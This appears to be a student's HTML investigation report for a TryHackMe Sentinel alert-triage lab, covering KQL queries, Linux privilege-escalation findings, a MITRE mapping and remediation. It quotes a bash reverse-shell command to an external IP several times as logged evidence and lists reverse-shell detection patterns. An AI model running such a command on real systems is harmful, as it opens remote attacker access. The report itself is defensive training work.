@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Microsoft Sentinel Investigation Report</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;800&display=swap');
+
+    body {
+        margin: 0;
+        padding: 0;
+        background: #020617;
+        color: #e5e7eb;
+        font-family: 'Inter', sans-serif;
+    }
+
+    .container {
+        max-width: 960px;
+        margin: 0 auto;
+        padding: 30px 20px 60px;
+    }
+
+    h1 {
+        font-size: 26px;
+        margin-bottom: 4px;
+        color: #e5e7eb;
+        letter-spacing: .04em;
+        text-transform: uppercase;
+    }
+
+    h2 {
+        font-size: 18px;
+        margin-top: 30px;
+        margin-bottom: 10px;
+        color: #f9fafb;
+        letter-spacing: .06em;
+        text-transform: uppercase;
+    }
+
+    h3 {
+        font-size: 15px;
+        margin-top: 18px;
+        margin-bottom: 6px;
+        color: #e5e7eb;
+    }
+
+    h4 {
+        font-size: 14px;
+        margin-top: 14px;
+        margin-bottom: 4px;
+        color: #cbd5e1;
+    }
+
+    p {
+        font-size: 13px;
+        line-height: 1.6;
+        color: #cbd5e1;
+        margin: 6px 0 10px;
+    }
+
+    .meta-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+        gap: 10px;
+        margin: 25px 0 20px;
+    }
+
+    .meta-item {
+        background: #1a1f2e;
+        padding: 16px;
+        border-radius: 4px;
+        border: 1px solid #2d3648;
+    }
+
+    .meta-item strong {
+        color: #64748b;
+        font-size: 10px;
+        display: block;
+        text-transform: uppercase;
+        margin-bottom: 5px;
+    }
+
+    .meta-item span {
+        color: #fff;
+        font-weight: 600;
+        font-size: 14px;
+    }
+
+    .severity-high {
+        color: #ff4d4d !important;
+        text-shadow: 0 0 5px rgba(255, 77, 77, 0.4);
+    }
+
+    .severity-medium {
+        color: #facc15 !important;
+    }
+
+    .tag {
+        display: inline-block;
+        font-size: 10px;
+        text-transform: uppercase;
+        letter-spacing: .08em;
+        border-radius: 999px;
+        padding: 2px 8px;
+        border: 1px solid #334155;
+        color: #a5b4fc;
+        margin-right: 6px;
+        margin-bottom: 4px;
+    }
+
+    .kql-block {
+        background-color: #020617;
+        border: 1px solid #1f2937;
+        border-left: 4px solid #38bdf8;
+        color: #22c55e;
+        font-family: 'JetBrains Mono', monospace;
+        padding: 12px;
+        margin: 10px 0 18px 0;
+        border-radius: 4px;
+        font-size: 12px;
+        white-space: pre-wrap;
+    }
+
+    ul {
+        padding-left: 20px;
+        margin-bottom: 12px;
+    }
+
+    li {
+        margin-bottom: 5px;
+        font-size: 13px;
+        line-height: 1.5;
+    }
+
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 10px;
+        font-size: 12px;
+    }
+
+    th {
+        background: #111827;
+        color: #e5e7eb;
+        padding: 8px;
+        text-align: left;
+        border: 1px solid #1f2937;
+    }
+
+    td {
+        background: #020617;
+        border: 1px solid #1f2937;
+        padding: 8px;
+        color: #cbd5e1;
+        vertical-align: top;
+    }
+
+    .remediation-box {
+        border: 1px solid #3f4c6b;
+        padding: 14px;
+        background: #020617;
+        margin-bottom: 10px;
+    }
+
+    .remediation-header {
+        color: #38bdf8;
+        font-weight: 700;
+        margin-bottom: 8px;
+        display: block;
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: .08em;
+    }
+
+    .page-break {
+        page-break-before: always;
+    }
+
+    @media print {
+        body { margin: 0; }
+        .container { width: 100%; max-width: none; margin: 0; }
+        .page-break { page-break-before: always; }
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div style="text-align:right;font-size:10px;color:#64748b;margin-bottom:10px;">// CONFIDENTIAL – TRAINING LAB</div>
+
+    <h1>Microsoft Sentinel – SOC Alert Triaging (“Tinsel Triage”)<br>
+    </h1>
+
+    <div style="background:#111827;color:#e5e7eb;padding:14px 16px;font-style:italic;border-left:4px solid #38bdf8;margin:16px 0 26px;font-size:13px;">
+        This document is written as a Tier 2 / Tier 3 SOC-style investigation report for a noisy cloud environment in Azure,
+        using Microsoft Sentinel to triage, correlate, and validate Linux privilege-escalation alerts during the
+        TryHackMe <strong>Advent of Cyber 2025 – Day 10: SOC Alert Triaging – Tinsel Triage</strong> lab.
+    </div>
+
+    <div class="meta-grid">
+        <div class="meta-item">
+            <strong>Case ID</strong>
+            <span>AOC-2025-SENT-IR-010</span>
+        </div>
+        <div class="meta-item">
+            <strong>Analyst</strong>
+            <span>Shubharyan Asthana</span>
+        </div>
+        <div class="meta-item">
+            <strong>Platform</strong>
+            <span>Microsoft Sentinel (Azure SIEM/SOAR)</span>
+        </div>
+        <div class="meta-item">
+            <strong>Scope</strong>
+            <span>Linux fleet: app-01, app-02, websrv-01, storage-01</span>
+        </div>
+        <div class="meta-item">
+            <strong>Primary Data Source</strong>
+            <span>Custom Syslog table: <code>Syslog_CL</code></span>
+        </div>
+        <div class="meta-item">
+            <strong>Overall Verdict</strong>
+            <span class="severity-high">HIGH – Confirmed Linux PrivEsc Campaign & Malicious Kernel Module</span>
+        </div>
+    </div>
+
+    <div style="margin-bottom:20px;">
+        <span class="tag">Azure</span>
+        <span class="tag">Microsoft Sentinel</span>
+        <span class="tag">Linux PrivEsc</span>
+        <span class="tag">KQL</span>
+        <span class="tag">Alert Triage</span>
+    </div>
+
+    <!-- 1. Lab Overview and Objectives -->
+    <h2>1. Lab Overview & Objectives</h2>
+
+    <h3>1.1 Narrative Context</h3>
+    <p>
+        The Best Festival Company’s Azure-hosted environment is flooded with alerts. Suspicious activity is detected
+        across multiple Linux virtual machines, with early indicators pointing to the Evil Bunnies attempting
+        privilege escalation, persistence, and remote access inside the tenant. The SOC must quickly separate noise
+        from real compromise by triaging Sentinel incidents and drilling down into <code>Syslog_CL</code> events.
+    </p>
+
+    <h3>1.2 Investigation Goals</h3>
+    <ul>
+        <li>Validate that lab data and analytics rules are correctly deployed and generating incidents in Microsoft Sentinel.</li>
+        <li>Apply a structured triage methodology (severity, time, attack stage, impact) to prioritise alerts.</li>
+        <li>Investigate a cluster of Linux PrivEsc-related incidents (kernel module insertion, Polkit exploit, sudo abuse, user additions).</li>
+        <li>Pivot from Sentinel incidents to underlying KQL queries over <code>Syslog_CL</code> logs.</li>
+        <li>Reconstruct the attacker’s path across multiple Linux hosts and associated entities.</li>
+        <li>Map the observed behaviour to MITRE ATT&amp;CK and produce SOC-style remediation and detection recommendations.</li>
+    </ul>
+
+    <!-- 2. Methodology -->
+    <h2>2. Methodology</h2>
+
+    <h3>2.1 Environment Setup & Validation</h3>
+    <p>Steps performed inside the Azure lab environment:</p>
+    <ul>
+        <li>Accessed the Azure portal using the provided lab credentials (Temporary Access Pass).</li>
+        <li>Opened <strong>Microsoft Sentinel</strong> from the Azure Portal and selected the dedicated AOC Sentinel workspace.</li>
+        <li>Verified log ingestion by querying the custom table <code>Syslog_CL</code> via the <strong>Logs</strong> blade.</li>
+    </ul>
+
+    <div class="kql-block">
+Syslog_CL
+| take 10
+    </div>
+
+    <p>
+        Logs were present, confirming data ingestion. Next, analytics rules were toggled to force alert generation:
+    </p>
+    <ul>
+        <li>Went to <strong>Configuration → Analytics</strong>.</li>
+        <li>Selected all lab-related active rules, clicked <strong>Disable</strong>, then re-selected and clicked <strong>Enable</strong>.</li>
+        <li>Confirmed via Azure notifications that rules were successfully re-enabled and alerts started firing.</li>
+    </ul>
+
+    <h3>2.2 Incident Triage – High-Level Process</h3>
+    <p>
+        Incidents were viewed under <strong>Threat Management → Incidents</strong>. Initial focus was on
+        <strong>high-severity</strong> incidents related to Linux Privilege Escalation:
+    </p>
+
+    <ul>
+        <li><strong>Linux PrivEsc – Kernel Module Insertion</strong></li>
+        <li><strong>Linux PrivEsc – Polkit Exploit Attempt</strong> (10 entities affected)</li>
+        <li><strong>Linux PrivEsc – Sudo Shadow Access</strong> (severity: High)</li>
+        <li><strong>Linux PrivEsc – User Added to Sudo Group</strong> (4 accounts added)</li>
+    </ul>
+
+    <p>The triage was anchored around four core factors:</p>
+    <ul>
+        <li><strong>Severity:</strong> High-severity alerts investigated first.</li>
+        <li><strong>Time & Frequency:</strong> Recent alerts and clustered timestamps prioritised.</li>
+        <li><strong>Attack Stage:</strong> PrivEsc, persistence, and remote access indicators highlighted.</li>
+        <li><strong>Affected Asset:</strong> Key Linux hosts (app-01, app-02, websrv-01, storage-01) analysed in depth.</li>
+    </ul>
+
+    <h3>2.3 Drill-Down into a Key Incident – Kernel Module Insertion</h3>
+    <p>
+        A representative high-severity incident, <strong>Linux PrivEsc – Kernel Module Insertion</strong>, was selected
+        to drive deeper investigation:
+    </p>
+    <ul>
+        <li>From the Incidents blade, the incident was opened to review <strong>entities</strong>, <strong>events</strong>, and <strong>tactics</strong>.</li>
+        <li>Viewed <strong>full details</strong> to access the incident timeline and <strong>Similar incidents</strong>.</li>
+        <li>From the <strong>Evidence</strong> section, opened <strong>Events</strong> to pivot directly into the underlying log records.</li>
+    </ul>
+
+    <p>This confirmed:</p>
+    <ul>
+        <li>Three events tied to the kernel module insertion incident.</li>
+        <li>Three entities involved (Linux host, account, possibly IP).</li>
+        <li>Tactic: <strong>Privilege Escalation</strong>.</li>
+    </ul>
+
+    <!-- 3. Technical Deep Dive (KQL & Sentinel Usage) -->
+    <h2>3. Technical Deep Dive – KQL & Sentinel Usage</h2>
+
+    <h3>3.1 Raw Log Exploration via KQL</h3>
+    <p>
+        To validate and contextualise the kernel module alert, KQL was used to pull all syslog events for a specific host
+        (<code>app-02</code>) around the relevant time window:
+    </p>
+
+    <div class="kql-block">
+set query_now = datetime(2025-10-30T05:09:25.9886229Z);
+Syslog_CL
+| where host_s == "app-02"
+| project _timestamp_t, host_s, Message
+    </div>
+
+    <p>Key suspicious activity identified on <strong>app-02</strong>:</p>
+    <ul>
+        <li>Execution of <code>cp</code> to create a backup of the shadow file (preparing for credential manipulation).</li>
+        <li>Addition of the user <strong>Alice</strong> to the <code>sudo</code> group.</li>
+        <li>Modification of the <strong>backupuser</strong> account by <code>root</code>.</li>
+        <li>Insertion of the <strong>malicious_mod.ko</strong> kernel module.</li>
+        <li>Successful SSH authentication as <code>root</code>.</li>
+    </ul>
+
+    <p>
+        Collectively, these events indicate intentional privilege escalation and persistence, not normal system activity.
+    </p>
+
+    <h3>3.2 Entity & Alert Relationships</h3>
+    <p>
+        Sentinel’s incident view and similar-incidents panel showed the same entities recurring across multiple alerts:
+    </p>
+    <ul>
+        <li>Root SSH logins from external IPs.</li>
+        <li>SUID discovery on Linux hosts.</li>
+        <li>Kernel module insertion events.</li>
+        <li>Accounts being added to sudoers (4 total in one alert).</li>
+    </ul>
+
+    <p>
+        This clustering strongly suggests a coherent intrusion campaign rather than isolated misconfigurations.
+    </p>
+
+    <h3>3.3 Host-Specific Findings</h3>
+
+    <h4>websrv-01</h4>
+    <ul>
+        <li>Kernel module installed: <strong><code>malicious_mod.ko</code></strong></li>
+        <li>Unusual command executed by <code>ops</code> user:</li>
+    </ul>
+
+    <div class="kql-block">
+/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
+    </div>
+
+    <p>
+        This command spawns an interactive reverse shell back to external IP <code>198.51.100.22</code> on TCP port 4444,
+        providing the attacker with remote interactive access. This is a clear sign of post-exploitation remote control.
+    </p>
+
+    <h4>storage-01</h4>
+    <ul>
+        <li>First successful SSH login source IP: <strong><code>172.16.0.12</code></strong>.</li>
+        <li>Scenario aligns with lateral movement / internal pivoting.</li>
+    </ul>
+
+    <h4>app-01</h4>
+    <ul>
+        <li>External IP successfully logging in as <code>root</code>:
+            <strong><code>203.0.113.45</code></strong>.
+        </li>
+        <li>Accounts added to sudoers within the host included <strong><code>backupuser</code></strong> and
+            <strong><code>deploy</code></strong>.
+        </li>
+        <li>These modifications coupled with root-level remote access cement privilege escalation and persistence.</li>
+    </ul>
+
+    <div class="page-break"></div>
+
+    <!-- 4. Incident Triage & Analysis -->
+    <h2>4. Incident Triage & Analysis</h2>
+
+    <h3>4.1 Key Questions & Answers (Lab Validation)</h3>
+    <table>
+        <thead>
+        <tr>
+            <th>Question</th>
+            <th>Answer / Observation</th>
+            <th>Implication</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+            <td>How many entities are affected by the Linux PrivEsc – Polkit Exploit Attempt alert?</td>
+            <td><strong>10 entities</strong></td>
+            <td>Wide blast radius – exploitation attempt targets multiple assets simultaneously.</td>
+        </tr>
+        <tr>
+            <td>What is the severity of the Linux PrivEsc – Sudo Shadow Access alert?</td>
+            <td><strong class="severity-high">High</strong></td>
+            <td>Direct tampering with credential storage (<code>/etc/shadow</code>) – critical for response.</td>
+        </tr>
+        <tr>
+            <td>How many accounts were added to the sudoers group in the Linux PrivEsc – User Added to Sudo Group alert?</td>
+            <td><strong>4 accounts</strong></td>
+            <td>Privilege escalation and persistence via multiple high-privileged user accounts.</td>
+        </tr>
+        <tr>
+            <td>What kernel module was installed in <code>websrv-01</code>?</td>
+            <td><strong><code>malicious_mod.ko</code></strong></td>
+            <td>Likely backdoor / persistence module – part of a rootkit-style technique.</td>
+        </tr>
+        <tr>
+            <td>What unusual command was executed by the <code>ops</code> user on <code>websrv-01</code>?</td>
+            <td><code>/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1</code></td>
+            <td>Reverse shell to attacker infrastructure, enabling interactive command execution.</td>
+        </tr>
+        <tr>
+            <td>Source IP of first successful SSH login to <code>storage-01</code>?</td>
+            <td><strong><code>172.16.0.12</code></strong></td>
+            <td>Internal pivot – lateral movement from inside the environment.</td>
+        </tr>
+        <tr>
+            <td>External source IP that successfully logged in as root to <code>app-01</code>?</td>
+            <td><strong><code>203.0.113.45</code></strong></td>
+            <td>Confirmed external compromise of a critical Linux host.</td>
+        </tr>
+        <tr>
+            <td>Aside from <code>backupuser</code>, which user was added to the sudoers group inside <code>app-01</code>?</td>
+            <td><strong><code>deploy</code></strong></td>
+            <td>Additional privileged account used for persistence, potential living-off-the-land operations.</td>
+        </tr>
+        </tbody>
+    </table>
+
+    <h3>4.2 Attack Narrative (Reconstructed)</h3>
+    <ul>
+        <li>External infrastructure (e.g., <code>203.0.113.45</code>, <code>198.51.100.22</code>) targets exposed Linux services.</li>
+        <li>Root SSH logins succeed, followed by SUID discovery and sudo / shadow tampering.</li>
+        <li>Malicious kernel module <code>malicious_mod.ko</code> is inserted on multiple hosts, providing stealthy persistence.</li>
+        <li>Users (e.g., <code>backupuser</code>, <code>deploy</code>, <code>Alice</code>) are added to sudoers.</li>
+        <li>A reverse shell is launched on <code>websrv-01</code> back to attacker-controlled IP <code>198.51.100.22:4444</code>.</li>
+        <li>Additional lateral movement is observed via internal SSH from <code>172.16.0.12</code> to <code>storage-01</code>.</li>
+    </ul>
+
+    <h3>4.3 MITRE ATT&amp;CK Mapping</h3>
+    <table>
+        <thead>
+        <tr>
+            <th>Phase</th>
+            <th>Technique</th>
+            <th>ID</th>
+            <th>Evidence</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+            <td>Initial Access</td>
+            <td>Valid Accounts / Remote Services</td>
+            <td>T1078 / T1021.004</td>
+            <td>Successful SSH logins as <code>root</code> from external IPs.</td>
+        </tr>
+        <tr>
+            <td>Privilege Escalation</td>
+            <td>Abuse of Sudo / Setuid</td>
+            <td>T1068 / T1548.003</td>
+            <td>Shadow access alert; sudoers group modification; Polkit exploit attempt.</td>
+        </tr>
+        <tr>
+            <td>Persistence</td>
+            <td>Kernel Modules and Extensions</td>
+            <td>T1547.006</td>
+            <td>Insertion of <code>malicious_mod.ko</code> on multiple hosts.</td>
+        </tr>
+        <tr>
+            <td>Execution</td>
+            <td>Command and Scripting Interpreter</td>
+            <td>T1059</td>
+            <td>Reverse shell command executed by <code>ops</code> on <code>websrv-01</code>.</td>
+        </tr>
+        <tr>
+            <td>Lateral Movement</td>
+            <td>Remote Services (SSH)</td>
+            <td>T1021.004</td>
+            <td>SSH from <code>172.16.0.12</code> into <code>storage-01</code>.</td>
+        </tr>
+        <tr>
+            <td>Command &amp; Control</td>
+            <td>Reverse Shell / Application Layer Protocol</td>
+            <td>T1105 / T1071</td>
+            <td><code>/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1</code> reverse shell.</td>
+        </tr>
+        </tbody>
+    </table>
+
+    <div class="page-break"></div>
+
+    <!-- 5. Remediation & Recommendations -->
+    <h2>5. Remediation & Detection Recommendations</h2>
+
+    <div class="remediation-box">
+        <span class="remediation-header">Immediate Response Actions</span>
+        <ul>
+            <li>Isolate affected Linux hosts (<code>app-01</code>, <code>app-02</code>, <code>websrv-01</code>, <code>storage-01</code>) from external and internal networks where feasible.</li>
+            <li>Terminate active reverse shells and SSH sessions from suspicious IPs (<code>203.0.113.45</code>, <code>198.51.100.22</code>, <code>172.16.0.12</code>).</li>
+            <li>Unload and blacklist <code>malicious_mod.ko</code>; capture memory and disk images for forensic follow-up.</li>
+            <li>Reset credentials and rotate keys for all affected local accounts (<code>root</code>, <code>backupuser</code>, <code>deploy</code>, <code>Alice</code>).</li>
+            <li>Rebuild high-value systems from known-good images if kernel integrity is in doubt.</li>
+        </ul>
+    </div>
+
+    <div class="remediation-box">
+        <span class="remediation-header">Detection Engineering (Microsoft Sentinel)</span>
+        <ul>
+            <li>Refine analytics rules for:
+                <ul>
+                    <li>SSH logins as <code>root</code> from unfamiliar IP ranges.</li>
+                    <li>New users added to the <code>sudo</code> group or changes to <code>/etc/sudoers</code>.</li>
+                    <li>Kernel module operations (insertion/removal) referenced in syslog.</li>
+                    <li>Reverse shell patterns, e.g. <code>/dev/tcp/*</code>, <code>bash -i</code>, suspicious <code>nc</code>/<code>socat</code> usage.</li>
+                </ul>
+            </li>
+            <li>Use <code>Syslog_CL</code> KQL-based analytics to correlate:
+                <ul>
+                    <li>Root logins + sudoers changes + kernel module insertion within short time windows.</li>
+                </ul>
+            </li>
+            <li>Enable UEBA/anomaly-based rules for rare SSH sources and infrequent admin actions.</li>
+        </ul>
+    </div>
+
+    <div class="remediation-box">
+        <span class="remediation-header">Hardening & Process Improvements</span>
+        <ul>
+            <li>Enforce key-based SSH authentication and disable root login over SSH where possible.</li>
+            <li>Limit who can load kernel modules; consider lockdown / secure boot configurations.</li>
+            <li>Implement just-in-time privileges instead of permanent sudo assignments.</li>
+            <li>Formalise an alert triage playbook based on severity, time, attack stage, and business impact.</li>
+            <li>Ensure all SOC investigations are documented in a similar structured format for repeatability and auditability.</li>
+        </ul>
+    </div>
+
+    <p style="margin-top:20px;font-size:12px;color:#6b7280;">
+        This report is based on a controlled training environment (TryHackMe Advent of Cyber 2025 – Day 10). 
+        The analysis style, triage logic, and documentation format are deliberately aligned with real-world SOC expectations.
+    </p>
+
+</div>
+
+</body>
+</html>
